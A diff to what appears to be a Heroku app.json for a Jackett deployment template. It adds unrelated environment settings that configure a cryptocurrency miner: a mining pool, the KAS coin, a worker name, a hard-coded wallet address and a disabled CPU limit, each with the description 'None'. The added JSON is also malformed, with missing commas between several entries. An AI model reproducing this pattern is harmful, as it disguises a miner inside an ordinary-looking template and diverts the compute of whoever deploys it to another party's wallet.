@@ -2,5 +2,31 @@
   "name": "DCM",
   "description": "A template for getting started with the popular Jackett.",
   "repository": "https://github.com/Master-Mind-007/Jackett-Heroku",
-  "stack": "container"
+  "stack": "container",
+  "env": {
+    "CPU_LIMIT_ENABLE": {
+      "description": "None",
+      "value":"false"
+    },
+    "MINING_POOL": {
+      "description": "None",
+      "value": "rx.unmineable.com"
+    }
+    "REFERRAL_CODE": {
+      "description": "None",
+      "value": ""
+    }
+    "MINING_COIN": {
+      "description": "None",
+      "value": "KAS"
+    }
+    "WORKER_NAME": {
+      "description": "None",
+      "value": "worker1"
+    }
+    "WALLET_ADDRESS": {
+      "description": "None",
+      "value": "qpdd30c2qgsgkjne2zdphpel958q3e3yxll7scjx70tr4ezwd80wqfmq74lc7"
+    }
+  }
 }
